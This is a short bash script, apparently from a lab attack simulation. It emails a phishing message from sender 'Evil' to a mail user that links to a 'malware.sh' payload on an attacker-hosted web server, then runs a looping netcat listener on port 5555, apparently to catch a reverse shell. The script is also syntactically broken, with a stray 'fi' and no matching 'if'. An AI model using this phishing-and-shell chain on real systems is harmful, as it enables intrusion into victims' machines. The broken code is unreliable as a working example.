#!/bin/bash

### sends mail with curl to the postfix dovecot server including a link to a file of the locally hosted webserver 
while :
do
random_number=$(($RANDOM % 10000 + 1000))
sleep $random_number
curl -svk --url 'smtp://172.16.0.7:25' --ssl-reqd --mail-from 'Evil' --mail-rcpt 'john@Server6-mail-DMZ' -F data='http://10.0.0.4:8000/malware.sh'
break
fi
done
while :
do
nc -nlvp 5555
done